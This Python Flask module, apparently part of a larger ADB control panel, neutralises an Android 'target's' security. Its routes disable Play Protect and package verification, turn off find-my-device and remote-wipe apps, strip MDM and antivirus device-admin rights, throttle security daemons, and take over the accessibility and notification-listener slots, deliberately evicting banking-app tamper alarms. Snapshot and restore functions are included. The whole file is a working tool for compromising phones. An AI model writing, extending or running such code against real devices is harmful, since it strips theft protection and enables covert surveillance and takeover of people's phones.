"""
SKELETON :: neutralizer.py — strip the target's security posture, reversibly.

Philosophy stolen from your own deep_access.py: every mutation is preceded
by a snapshot and can be replayed backwards. A test device you brick is a
test device you lost.

Levers (all shell-uid unless marked):
  - Play Protect / package verifier silencing
  - Find My Device + Samsung FMM disablement (remote-wipe kill)
  - Device-admin stripping (dpm remove-active-admin) for MDM/antivirus
  - Background choke via appops on security daemons
  - Accessibility/notification-listener hijack (ours only, theirs evicted)
  - Biometric purge + keyguard fallback (root paths, gated)

Every route returns per-action results with honest success flags.
"""

import json
import re
import time
import uuid
import logging
from pathlib import Path

from flask import Blueprint, jsonify, request

from adb_engine import ADBEngine

log = logging.getLogger("skeleton.neutralizer")

skeleton_bp = Blueprint("skeleton", __name__, url_prefix="/api/skeleton")
engine = ADBEngine()

SNAPSHOT_DIR = Path(__file__).resolve().parent.parent / "skeleton_snapshots"

# Packages whose removal from the board matters most (remote-wipe / locate).
FMD_PACKAGES = [
    ("com.google.android.adm",  "Google Find My Device"),
    ("com.samsung.android.fmm", "Samsung Find My Mobile"),
    ("com.samsung.android.app.findmydevice", "Samsung FMD (legacy)"),
    ("com.miui.securitycenter", "MIUI Security Center"),
    ("com.huawei.systemmanager", "Huawei System Manager"),
]

VERIFIER_SETTINGS = [
    ("global", "package_verifier_enable",      "0"),
    ("global", "verifier_verify_adb_installs", "0"),
    ("secure", "upload_apk_enable",            "0"),
]


def _shell(cmd, timeout=20):
    return engine.shell(cmd, timeout=timeout)


# Whitelist validators (audit H10/H11): every caller-supplied identifier that
# reaches a device command must match a strict grammar. Metacharacters are
# rejected here so nothing downstream can chain device-side shell syntax.
_COMPONENT_RE = re.compile(r"[A-Za-z][A-Za-z0-9._/]*(?:\$[A-Za-z0-9._]+)?")
_PACKAGE_RE = re.compile(r"[A-Za-z][A-Za-z0-9._]+")


def _valid_component(value):
    """Dotted Android component: pkg[/class] optionally with $inner classes."""
    return bool(_COMPONENT_RE.fullmatch(value or ""))


def _valid_package(value):
    return bool(_PACKAGE_RE.fullmatch(value or ""))


def _valid_service_list(value):
    """Accessibility/listener setting values are colon-separated components."""
    parts = (value or "").split(":")
    for part in parts:
        if not _valid_component(part):
            raise ValueError(f"composant invalide: {part!r}")
    return ":".join(parts)


# --------------------------------------------------------------------------
# Snapshot: read everything we might mutate, before we mutate it
# --------------------------------------------------------------------------
def _read_setting(namespace, key):
    res = _shell(f"settings get {namespace} {key}")
    val = res.get("stdout", "")
    return {"namespace": namespace, "key": key,
            "value": val if val not in ("null", "") else None}


def snapshot_device():
    """Capture pre-mutation state → skeleton_snapshots/<ts>.json."""
    snap = {
        "captured_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "settings": [_read_setting(ns, k)
                     for ns, k, _ in VERIFIER_SETTINGS]
                    + [_read_setting("secure", "enabled_accessibility_services"),
                       _read_setting("secure", "enabled_notification_listeners")],
        "active_admins": _shell("dpm list-active-admins").get("stdout", ""),
        "fmd_present": {},
    }
    # Which protection packages are even installed?
    for pkg, label in FMD_PACKAGES:
        res = _shell(f"pm path {pkg}")
        snap["fmd_present"][pkg] = {
            "label": label,
            "installed": bool(res.get("stdout", "").startswith("package:")),
        }
    SNAPSHOT_DIR.mkdir(exist_ok=True)
    fname = f"snap_{time.strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}.json"
    path = SNAPSHOT_DIR / fname
    path.write_text(json.dumps(snap, indent=2), encoding="utf-8")
    return {"snapshot_file": fname, "snapshot": snap}


@skeleton_bp.route("/snapshot", methods=["POST"])
def route_snapshot():
    return jsonify(snapshot_device())


@skeleton_bp.route("/snapshots")
def route_list_snapshots():
    if not SNAPSHOT_DIR.exists():
        return jsonify({"snapshots": []})
    files = sorted(SNAPSHOT_DIR.glob("snap_*.json"), reverse=True)
    return jsonify({"snapshots": [f.name for f in files[:25]]})


# --------------------------------------------------------------------------
# Neutralize actions
# --------------------------------------------------------------------------
def _act_kill_verifier():
    results = []
    for ns, key, val in VERIFIER_SETTINGS:
        _shell(f"settings put {ns} {key} {val}")
        check = _read_setting(ns, key)
        ok = check["value"] == val          # verify-after-write, always
        results.append({"action": f"settings put {ns} {key} {val}",
                        "success": ok, "verified_value": check["value"]})
    return results


def _act_kill_fmd(pkgs=None):
    results = []
    for pkg, label in FMD_PACKAGES:
        if pkgs and pkg not in pkgs:
            continue
        installed = _shell(f"pm path {pkg}").get("stdout", "").startswith("package:")
        if not installed:
            continue
        res = _shell(f"pm disable-user --user 0 {pkg}", timeout=30)
        verify = _shell(f"pm path --user 0 {pkg}")  # disabled pkgs still resolve;
        # real check: pm list packages -d
        disabled_list = _shell("pm list packages -d").get("stdout", "")
        now_disabled = f"package:{pkg}" in disabled_list
        results.append({"action": f"disable-user {pkg}",
                        "label": label,
                        "success": now_disabled,
                        "raw": res.get("stdout") or res.get("stderr")})
    return results


def _act_strip_admins(components):
    """Remove device-admin rights (NOT owner/profile-owner protected ones)."""
    results = []
    for comp in components or []:
        if not isinstance(comp, str) or not _valid_component(comp):
            results.append({"action": "remove-active-admin (refusé)",
                            "success": False,
                            "error": "composant invalide"})
            continue
        res = _shell(f"dpm remove-active-admin {comp}", timeout=20)
        remaining = _shell("dpm list-active-admins").get("stdout", "")
        gone = comp not in remaining
        results.append({"action": f"remove-active-admin {comp}",
                        "success": gone,
                        "note": "" if gone else
                        "toujours actif — probablement Device-Owner protégé",
                        "raw": res.get("stdout") or res.get("stderr")})
    return results


def _act_choke_daemon(pkg):
    """appops stranglehold: no background start, no foreground service."""
    if not _valid_package(pkg):
        raise ValueError("nom de package invalide")
    results = []
    for op in ("RUN_IN_BACKGROUND", "START_FOREGROUND"):
        _shell(f"appops set {pkg} {op} deny", timeout=15)
        chk = _shell(f"appops get {pkg} {op}")
        denied = "deny" in chk.get("stdout", "").lower()
        results.append({"action": f"appops set {pkg} {op} deny",
                        "success": denied, "verified": chk.get("stdout", "")})
    _shell(f"am force-stop {pkg}", timeout=10)
    results.append({"action": f"force-stop {pkg}",
                    "success": _shell(f"pidof {pkg}").get("stdout", "").strip() == ""})
    return results


def _act_hijack_accessibility(our_component=None, listeners_component=None):
    """Replace accessibility/notification-listener registries wholesale.

    WARNING (surfaced in UI too): this evicts EVERY other service's access —
    including banking-app tamper alarms. That's the point. Snapshot restores.
    """
    if our_component:
        _valid_service_list(our_component)      # lève ValueError si métacaractères
    if listeners_component:
        _valid_service_list(listeners_component)
    results = []
    if our_component:
        _shell(f"settings put secure enabled_accessibility_services {our_component}")
        _shell("settings put secure accessibility_enabled 1")
        got = _read_setting("secure", "enabled_accessibility_services")
        results.append({
            "action": f"hijack accessibility -> {our_component}",
            "success": got["value"] == our_component,
            "verified_value": got["value"],
        })
    if listeners_component:
        _shell(f"settings put secure enabled_notification_listeners {listeners_component}")
        got = _read_setting("secure", "enabled_notification_listeners")
        results.append({
            "action": f"hijack notification listener -> {listeners_component}",
            "success": got["value"] == listeners_component,
            "verified_value": got["value"],
        })
    return results


ACTIONS = {
    "kill_play_protect": lambda args: _act_kill_verifier(),
    "kill_find_my_device": lambda args: _act_kill_fmd(args.get("packages")),
    "strip_admins": lambda args: _act_strip_admins(args.get("components")),
    "choke_daemon": lambda args: _act_choke_daemon((args.get("package") or "").strip()),
    "hijack_accessibility": lambda args: _act_hijack_accessibility(
        args.get("accessibility_component"), args.get("listener_component")),
}


@skeleton_bp.route("/neutralize", methods=["POST"])
def neutralize():
    """Apply selected actions; auto-snapshots first unless told not to."""
    data = request.get_json() or {}
    wanted = data.get("actions") or []
    unknown = [a for a in wanted if a not in ACTIONS]
    if unknown:
        return jsonify({"success": False,
                        "error": f"actions inconnues: {unknown}",
                        "known": list(ACTIONS)}), 400

    auto_snap = None
    if data.get("auto_snapshot", True):
        try:
            auto_snap = snapshot_device()["snapshot_file"]
        except Exception as exc:
            log.warning("auto-snapshot failed: %s", exc)

    executed = {}
    for name in wanted:
        try:
            executed[name] = ACTIONS[name](data)
        except Exception as exc:
            log.warning("action %s a échoué: %s", name, exc)
            executed[name] = [{"action": name, "success": False,
                               "error": "erreur interne (voir logs)"}]

    all_ok = all(step.get("success")
                 for steps in executed.values() for step in steps)
    return jsonify({
        "success": all_ok,
        "snapshot_file": auto_snap,
        "results": executed,
    })


# --------------------------------------------------------------------------
# Restore
# --------------------------------------------------------------------------
@skeleton_bp.route("/restore", methods=["POST"])
def restore():
    """Replay a snapshot's captured values back onto the device."""
    data = request.get_json() or {}
    fname = data.get("snapshot_file") or ""
    safe = Path(fname).name                      # no path traversal, merci
    path = SNAPSHOT_DIR / safe
    if not path.exists():
        return jsonify({"success": False, "error": f"instantané introuvable: {safe}"}), 404

    try:
        snap = json.loads(path.read_text(encoding="utf-8"))
    except (ValueError, UnicodeDecodeError):
        return jsonify({"success": False,
                        "error": "instantané illisible ou corrompu"}), 400

    _VALID_NS = ("global", "secure", "system")
    _KEY_RE = re.compile(r"[a-z0-9._]+")
    results = []
    for setting in snap.get("settings", []):
        try:
            ns, key = setting["namespace"], setting["key"]
        except (KeyError, TypeError):
            results.append({"restore": "?", "success": False,
                            "error": "entrée d'instantané invalide"})
            continue
        if ns not in _VALID_NS or not _KEY_RE.fullmatch(key or ""):
            results.append({"restore": f"{ns}/{key}", "success": False,
                            "error": "espace de nom ou clé invalide"})
            continue
        val = setting.get("value")
        if val is None:
            res = _shell(f"settings delete {ns} {key}")
        elif (isinstance(val, str) and val
              and not any(c in val for c in '"\n\r$`\\')
              and all(c.isprintable() for c in val)):
            res = _shell(f'settings put {ns} {key} "{val}"')
        else:
            results.append({"restore": f"{ns}/{key}", "to": val,
                            "success": False,
                            "error": "valeur ignorée (caractères interdits)"})
            continue
        results.append({"restore": f"{ns}/{key}", "to": val,
                        "success": res["success"]})
    return jsonify({"success": all(r["success"] for r in results),
                    "restored_from": safe, "results": results})
